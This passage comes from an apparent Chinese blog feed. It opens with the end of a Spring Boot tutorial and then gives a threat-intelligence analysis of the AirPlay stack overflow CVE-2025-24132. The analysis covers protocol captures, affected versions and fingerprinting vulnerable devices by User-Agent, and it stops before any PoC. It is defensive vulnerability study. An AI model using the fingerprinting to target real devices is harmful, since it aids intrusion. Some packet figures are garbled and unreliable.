 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过<span class="doctag">@Component</span>注解，将这个类注册为SB的一个组件，交给SB框架进行管理****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//注册为SB的一个组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//如果有多个类型相同的组件，需要根据具体的类，指定要关联哪一个组件</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//自动关联类为UserDao的组件</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//这三行代码相当于：UserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**通过注解，告诉SB这是一个配置类****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//告诉SB，要管理哪个包下面的组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>单元测试</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//如果报错，在pom.xml中添加junit依赖</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//获取SB容器（这里是根据JavaConfig这个类创建出来的容器）</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//获取容器中的一个Bean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序输出：UserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DI之后) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-24132威胁情报分析</title>
    <url>/CVE-2025-24132.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><blockquote>
<ol>
<li>以色列网络安全公司“Oligo”披露了AirPlay协议中存在的一组漏洞，命名为 “AirBorne” 。其中值得关注的有两个：CVE-2025-24132、CVE-2025-24252。</li>
<li>参考文章<ul>
<li><a href="https://zhuanlan.zhihu.com/p/683643576">深入解析RTSP协议：流媒体传输的控制核心 - 知乎</a></li>
<li><a href="https://fingergit.github.io/Unofficial-AirPlay-Protocol-Specification/AirPlay.html">AirPlay协议规范（非官方）</a></li>
<li><a href="https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay">https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay</a></li>
<li><a href="https://blog.csdn.net/weixin_30481539/article/details/151272328">AirPlay协议源码分析与协议详解-CSDN博客</a></li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Airplay是苹果公司推出的一套基于以太网通信的远程音视频播放协议，用来远程播放音频、视屏等等（比如iPhone上的屏幕镜像功能、直播投屏）利用现有的TCP&#x2F;IP协议栈，增加了一些功能，包括从设备的发现 -&gt; 设备连接 -&gt; 音频&#x2F;视频流数据的传输。Airplay协议到目前（2025年）基本上历经了2个版本，在版本一中主要采用RTSP协议相TCP&#x2F;7000传输控制命令，而版本二中，主要采用HTTP协议向TCP&#x2F;7000传递命令；并且，在airplay2.x版本中，加上了TLS等加密和认证的手段，对传递的内容进行到了加密处理。Airpaly的实现采用C&#x2F;S架构，下面以iPhone作为Client、支持Apple TV作为Server进行讲述。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>端口</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>UDP（mDNS&#x2F;Bonjour）</td>
<td>5353</td>
<td>发现局域网中的Airplay客户端和服务端</td>
</tr>
<tr>
<td>TCP</td>
<td>7000</td>
<td>传输控制相关的命令（RTSP或者HTTP格式）</td>
</tr>
<tr>
<td>TCP</td>
<td>7100</td>
<td>传输镜像数据（投屏）</td>
</tr>
<tr>
<td>UDP</td>
<td>6000&#x2F;6001</td>
<td>传输RTP音频数据</td>
</tr>
</tbody></table>
<h3 id="通信过程描述"><a href="#通信过程描述" class="headerlink" title="通信过程描述"></a>通信过程描述</h3><ol>
<li><p>mDNS查询：iPhone利用mDNS(又叫做Bonjour)协议，发现周围支持airplay协议的设备</p>
<ul>
<li><p>iPhone通过udp5353端口，向多播地址224.0.0.251发起广播，寻找可用的airplay server</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line">  目标MAC: 01:00:5E:00:00:FB (组播地址)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 224.0.0.251 (mDNS组播地址)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  查询类型: PTR</span><br><span class="line">  查询名称: _airplay._tcp.local</span><br><span class="line">  含义: &quot;谁支持 AirPlay 服务？&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>设备进行单播响应（其实airplay server也会不停地向外发起广播，发送自己的设备信息）</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: 11:22:33:44:55:66 (Apple TV)</span><br><span class="line">  目标MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.200</span><br><span class="line">  目标IP: 192.168.1.100 (单播回复)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  响应类型: PTR</span><br><span class="line">  服务名称: Living Room Apple TV._airplay._tcp.local</span><br><span class="line">  IP地址: 192.168.1.200</span><br><span class="line">  端口: 7000</span><br><span class="line">  TXT记录: </span><br><span class="line">    - model=AppleTV6,2</span><br><span class="line">    - features=0x4A7FDFD5</span><br><span class="line">    - srcvers=220.68</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>TCP三次握手，Server的7000端口上建立连接（<strong>苹果的协议家族里面，会在TCP&#x2F;7000端口上面交互双方的设备信息&#x2F;控制命令等等，然后在其他端口上面传输实际的通信数据</strong>）</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff</span><br><span class="line">  目标MAC: 11:22:33:44:55:66</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line"></span><br><span class="line">TCP层:</span><br><span class="line">  源端口: 54321</span><br><span class="line">  目标端口: 7000</span><br><span class="line">  标志位: SYN</span><br><span class="line">  序列号: 1000</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 7000</span><br><span class="line">  目标端口: 54321</span><br><span class="line">  标志位: SYN+ACK</span><br><span class="line">  序列号: 2000</span><br><span class="line">  确认号: 1001</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 543213  </span><br><span class="line">  目标端口: 70004  </span><br><span class="line">  标志位: ACK5  </span><br><span class="line">  确认号: 2001</span><br></pre></td></tr></table></figure>
</li>
<li><p>AirPlay协议握手：用来控制多媒体对话，控制暂停、播放、传输格式等方面。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120170134581.png" alt="image-20251120170134581"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120165749893.png" alt="image-20251120165749893"></p>
<ul>
<li><p>iPhone发起RSTP OPTIONS请求（主要是用来查询Server支持什么样的命令传输方式）</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP连接: 192.168.1.100:54321 → 192.168.1.200:7000</span><br><span class="line"></span><br><span class="line">应用层数据:</span><br><span class="line">OPTIONS * RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: AirPlay/220.68</span><br><span class="line">Client-Instance: FBED9A-6539-4E15-B95A-37A6D88</span><br></pre></td></tr></table></figure>
</li>
<li><p>Apple TV回复RSTP OPTIONS响应</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Public: SETUP, RECORD, PAUSE, FLUSH, TEARDOWN, OPTIONS, </span><br><span class="line">        GET_PARAMETER, SET_PARAMETER, POST, GET</span><br><span class="line">Server: AirTunes/220.68</span><br></pre></td></tr></table></figure>
</li>
<li><p>iPhone发起RSTP SETUP，请求建立媒体流</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SETUP rtsp://192.168.1.200/stream RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;mode=record;control_port=6001;timing_port=6002</span><br></pre></td></tr></table></figure>
</li>
<li><p>后续步骤省略……</p>
</li>
</ul>
</li>
<li><p>传输音频&#x2F;视频的二进制数据</p>
<ul>
<li><p>通过RTP传输音频数据</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 随机</span><br><span class="line">  目标端口: 6000</span><br><span class="line"></span><br><span class="line">应用层 (RTP):</span><br><span class="line">  版本: 2</span><br><span class="line">  载荷类型: 96 (动态)</span><br><span class="line">  序列号: 12345</span><br><span class="line">  时间戳: 160000</span><br><span class="line">  同步源标识: 0xABCDEF12</span><br><span class="line">  载荷数据: [AAC编码的音频数据]</span><br></pre></td></tr></table></figure>
</li>
<li><p>后续步骤省略……</p>
</li>
</ul>
</li>
</ol>
<h3 id="wireshark抓包"><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">==========================================================</span><br><span class="line">||	Client                                              ||</span><br><span class="line">||		- device: iphone                                ||</span><br><span class="line">||		- ipv4: 172.20.10.1                             ||</span><br><span class="line">||		- MAC: c6:ac:aa:16:d4:64                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:e96e:515:63c1:f416   ||</span><br><span class="line">||	                                                    ||</span><br><span class="line">||	Server                                              ||</span><br><span class="line">||		- device: Airserver for windows 5.7.2.0         ||</span><br><span class="line">||		- ipv4: 172.20.10.6                             ||</span><br><span class="line">||		- MAC: e0:0a:f6:a6:48:c7                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:94d9:8df9:f144:e718  || </span><br><span class="line">==========================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= mDNS查询 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP三次握手 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 0</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00YqualifierZtxtAirPlay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone ======================= </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 21 Nov 2025 09:20:01 GMT</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line">	</span><br><span class="line">_E1:0A:F6:A6:48:C7XdeviceIDR&#125;_XfeaturesQ4[statusFlagsZAppleTV3,2UmodelQ2RvvV220.68]sourceVersionSAPTTname_audioInputFormats/8=FHT_egjqpdateC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">FPLYqA</span><br><span class="line">e&#x27;sQhw-?&gt;INNO`Lnz@IM8Rec$Xn]\cZcdG</span><br><span class="line">Xy-2Sh;g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 164</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY$e2(&#125;^g=4W;2As]A2yT0 K(UUHVK4XL</span><br><span class="line">=m	LV7-@mQv&amp;~+/3c),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">FPLY),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 658</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 3</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00	</span><br><span class="line"></span><br><span class="line"> !&quot;#$Ret_updateSessionRequestSeiv[sessionUUID_statsCollectionEnabledVosName^timingProtocol^osBuildVersion]sourceVersionZtimingPort_isScreenMirroringSessionYosVersionTekey_sessionCorrelationUUIDXdeviceIDUmodelTnameZmacAddress O~jHyfgd&#x27;_$CCE84329-32C7-4825-842A-F352FA3554C9YiPhone OSSNTPX23C5027fW925.3.2O	T26.2OHFPLY&lt; NV&#x27;YbbIx;5RQP_$41C6E7A1-FC63-49CE-884A-A1AB9358308E_BA:7E:91:22:2A:CBZiPhone15,3e^eO`i_C6:AC:AA:16:D4:64/2IMYry(OPZ^gorsx	%(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 77</span><br><span class="line">CSeq: 3</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00YeventPort|ZtimingPort</span><br><span class="line">:Th(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">CSeq: 4</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 821</span><br><span class="line">CSeq: 4</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00#$&amp;()+-.0:&lt;=%&#x27;</span><br><span class="line">*,</span><br><span class="line">/1;/R&#125;_XfeaturesSAPTTname	</span><br><span class="line">Xdisplays]widthPhysical	XrotationUwidth[widthPixels^heightPhysical8Vheight[overscanned\heightPixels_$4DA963C0-AA8F-4462-8EA9-694BC8B927C4Tuuid!dTtype_audioInputFormats_audioOutputFormats e&quot;f\audioFormatsRpiRvv[statusFlags_keepAliveLowPowerV220.68]sourceVersion_@355ce7d9bda3a97b18b91754287a2b26a680d64a56239a6ba8f813dd26415cc0Rpk_keepAliveSendStatsAsBody_E0:0A:F6:A6:48:C7XdeviceID2783564_outputLatencyMicrosWdefaultYaudioType_inputLatencyMicros356 4356&quot;9Umedia^audioLatenciesZAppleTV3,2UmodelZmacAddress).7;@BW`bpqz&#125;079@BORTWYey/7AV_hn&#125;:Th&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET_PARAMETER rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 8</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">CSeq: 5</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">volume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 5</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">volume: -0.000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">RECORD rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Audio-Latency: 0</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 204</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 7</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00Wstreams]timestampInfoYlatencyMsTtype_streamConnectionID	</span><br><span class="line">TnameUSubSu</span><br><span class="line"></span><br><span class="line">UBePxT</span><br><span class="line">UAfPxT</span><br><span class="line">UBefEn</span><br><span class="line">UEmEncKn@9,6;PVY^dgmpvy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 85</span><br><span class="line">CSeq: 7</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00WstreamsnTtypeXdataPort</span><br><span class="line">!$238-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">7100端口传输媒体数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 58</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bplist00WstreamsTtypen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 42</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 59</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP四次挥手 =======================</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2025-24132"><a href="#CVE-2025-24132" class="headerlink" title="CVE-2025-24132"></a>CVE-2025-24132</h2><ol>
<li><p>CVE-2025-24132 漏洞的成因是基于栈的缓冲区溢出（stack-based buffer overflow），出现在Apple AirPlay SDK 处理网络数据包的代码路径中。漏洞位于AirPlay SDK的网络数据解析模块中，具体是在处理来自本地网络的AirPlay协议数据包时，未能正确验证输入数据的长度，导致栈缓冲区被溢出覆盖。需要测试人员和目标系统位于同一个局域网（能够相互通信就好）。迄今为止（2025年11月25日），没能找到可以成功复现漏洞的PoC以及exp，YouTuBe上面该漏洞的提交者演示了利用过程，但仍然没有公开PoC。</p>
</li>
<li><p>影响的范围</p>
<ul>
<li>Airplay 音频SDK：&lt;2.7.1</li>
<li>Airplay 视频SDK：&lt;3.6.0</li>
<li>Carplay通信SDK：&lt;R18.1</li>
</ul>
</li>
<li><p>为什么Carplay会受到影响</p>
<ul>
<li>Carplay的无线通信机制底层依赖AirPlay协议栈，内部集成了AirPlay SDK，而该漏洞位于AirPlay SDK的网络数据解析模块中；</li>
<li>利用CVE-2025-24132攻击Carplay：通过iAP2协议连接上车机并自动交互WiFi凭证（蓝牙链路） -&gt; 脚本攻击（WiFi链路）</li>
</ul>
</li>
<li><p>网络嗅探分析版本</p>
<ul>
<li>wireshark抓取7000端口的流量：tcp.port&#x3D;&#x3D;7000</li>
<li>找到发往tcp&#x2F;7000的数据包，在User-Agent字段中大概率会出现“Airplay&#x2F;xx.xx.xx”的协议版本号（非标准软件可能会进行修改）</li>
</ul>
</li>
<li><p>airplay协议版本&amp;airplay SDK对应关系</p>
<table>
<thead>
<tr>
<th>协议版本（抓包 User-Agent）</th>
<th>SDK 版本（MFi 内部）</th>
</tr>
</thead>
<tbody><tr>
<td>AirPlay&#x2F;210.x</td>
<td>AirPlay Audio SDK &lt; 2.7.1</td>
</tr>
<tr>
<td>AirPlay&#x2F;220.x</td>
<td>AirPlay Audio SDK ≥ 2.7.1</td>
</tr>
<tr>
<td>AirPlay&#x2F;310.x</td>
<td>AirPlay Video SDK &lt; 3.6.0.126</td>
</tr>
<tr>
<td>AirPlay&#x2F;320.x</td>
<td>AirPlay Video SDK ≥ 3.6.0.126</td>
</tr>
<tr>
<td>AirPlay&#x2F;420.x</td>
<td>AirPlay Video SDK 3.8+</td>
</tr>
</tbody></table>
</li>
<li><p>PoC样例（未能找到合适的目标验证有效性，仅作参考）</p>
